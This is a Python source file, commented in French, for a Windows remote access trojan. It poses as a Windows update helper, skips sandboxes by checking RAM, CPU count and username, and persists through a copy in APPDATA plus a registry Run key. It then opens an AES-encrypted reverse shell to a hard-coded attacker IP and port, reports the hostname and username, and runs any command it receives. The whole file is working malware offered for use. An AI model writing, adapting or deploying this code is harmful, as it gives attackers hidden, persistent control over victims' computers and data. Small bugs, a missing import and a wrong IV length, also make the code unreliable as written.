import os
import sys
import base64
import socket
import subprocess
import time
import threading
import json
import random
import ctypes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# --- Configuration ---
AES_KEY = b'CeciEstUneCle16!'  # 16, 24 ou 32 octets
AES_IV = b'VoiciUnIVDe16Octets' # 16 octets
HOST = '192.168.1.10'  # IP de l'attaquant
PORT = 4444            # Port de l'attaquant

PROCESS_NAME = "WindowsUpdateHelper.exe"
PERSIST_PATH = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', PROCESS_NAME)

# --- OPTIMISATION 1 : Désactiver le buffering de Python ---
# Force Python à écrire les données immédiatement (plus rapide)
sys.stdout = os.fdopen(sys.stdout.fileno(), 'wb', 0)

def is_sandbox():
    try:
        kernel32 = ctypes.windll.kernel32
        c_ulong = ctypes.c_ulong
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", c_ulong),
                ("dwMemoryLoad", c_ulong),
                ("ullTotalPhys", c_ulonglong),
                ("ullAvailPhys", c_ulonglong),
                ("ullTotalPageFile", c_ulonglong),
                ("ullAvailPageFile", c_ulonglong),
                ("ullTotalVirtual", c_ulonglong),
                ("ullAvailVirtual", c_ulonglong),
                ("ullAvailExtendedVirtual", c_ulonglong),
            ]
        ram = MEMORYSTATUSEX()
        ram.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        kernel32.GlobalMemoryStatusEx(ctypes.byref(ram))
        if ram.ullTotalPhys < 4 * 1024 * 1024 * 1024: 
            return True
        if os.cpu_count() < 2:
            return True
        username = os.environ.get('USERNAME', '').lower()
        if 'sandbox' in username or 'virus' in username or 'malware' in username:
            return True
        return False
    except Exception:
        return False

def establish_persistence():
    if is_sandbox(): return 
    if os.path.exists(PERSIST_PATH):
        if sys.executable != PERSIST_PATH:
            try:
                subprocess.Popen(f'copy /Y "{sys.executable}" "{PERSIST_PATH}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except: pass
        return
    try:
        if not os.path.exists(os.path.dirname(PERSIST_PATH)):
            os.makedirs(os.path.dirname(PERSIST_PATH))
        if getattr(sys, 'frozen', False):
            import shutil
            shutil.copyfile(sys.executable, PERSIST_PATH)
        else:
            import shutil
            shutil.copyfile(sys.argv[0], PERSIST_PATH)
        
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        cmd = f'reg add "{key_path}" /v "WindowsUpdateService" /t REG_SZ /d "{PERSIST_PATH}" /f'
        subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        subprocess.Popen(PERSIST_PATH, shell=True)
        sys.exit(0)
    except Exception:
        pass

def aes_encrypt(data):
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
        return base64.b64encode(ct_bytes).decode('utf-8')
    except Exception:
        return None

def aes_decrypt(encoded_data):
    try:
        ct = base64.b64decode(encoded_data)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except Exception:
        return None

def run_cmd(command):
    try:
        if command.lower().startswith('cd '):
            new_dir = command[3:].strip()
            os.chdir(new_dir)
            return os.getcwd() + '>'
        else:
            # OPTIMISATION 2 : Désactiver la fenêtre et utiliser un buffer plus grand
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            result = subprocess.Popen(
                command, 
                shell=True, 
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                text=True,
                startupinfo=startupinfo
            )
            output, error = result.communicate()
            return output + error
    except Exception as e:
        return f"Error: {e}\n"

def handle_connection(s):
    try:
        # Envoi des infos initiales
        init_info = {
            "hostname": os.environ.get('COMPUTERNAME', 'Unknown'),
            "username": os.environ.get('USERNAME', 'Unknown'),
            "cwd": os.getcwd()
        }
        s.send(aes_encrypt(json.dumps(init_info)).encode('utf-8'))

        while True:
            # OPTIMISATION 3 : Timeout plus long pour éviter les déconnexions intempestives
            # Mais assez court pour réagir si la connexion coupe vraiment
            s.settimeout(60.0) 
            
            try:
                encrypted_cmd = s.recv(4096).decode('utf-8')
                if not encrypted_cmd:
                    break # Connexion fermée par le serveur
            except socket.timeout:
                # Si timeout, on envoie un heartbeat (ping) pour garder la connexion ouverte
                try:
                    s.send(aes_encrypt("PING").encode('utf-8'))
                except:
                    break # Si l'envoi échoue, la connexion est morte
                continue

            command = aes_decrypt(encrypted_cmd)
            if command is None:
                continue
            
            if command.lower() == 'exit':
                s.close()
                sys.exit(0)
            
            # Ignorer les pings du serveur s'il y en a
            if command == "PING":
                continue
            
            output = run_cmd(command)
            encrypted_output = aes_encrypt(output)
            
            if encrypted_output:
                s.send(encrypted_output.encode('utf-8'))

    except Exception:
        pass # Une erreur est survenue, on retourne à la boucle principale
    finally:
        try:
            s.close()
        except:
            pass

def main_loop():
    establish_persistence()
    
    # OPTIMISATION 4 : Backoff exponentiel pour la reconnexion
    # Au lieu d'attendre bêtement, on attend de plus en plus longtemps si ça échoue
    retry_count = 0
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # OPTIMISATION 5 : Activer TCP Keep-Alive au niveau de la socket
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            s.connect((HOST, PORT))
            
            # Réinitialiser le compteur de retry si connexion réussie
            retry_count = 0
            handle_connection(s)
            
        except Exception:
            retry_count += 1
            # Attendre : min(retry_count * 2, 60) secondes
            # Ex: 2s, 4s, 8s, 16s... jusqu'à max 60s
            wait_time = min((retry_count * 2), 60)
            time.sleep(wait_time)

if __name__ == "__main__":
    main_thread = threading.Thread(target=main_loop, daemon=True)
    main_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit(0)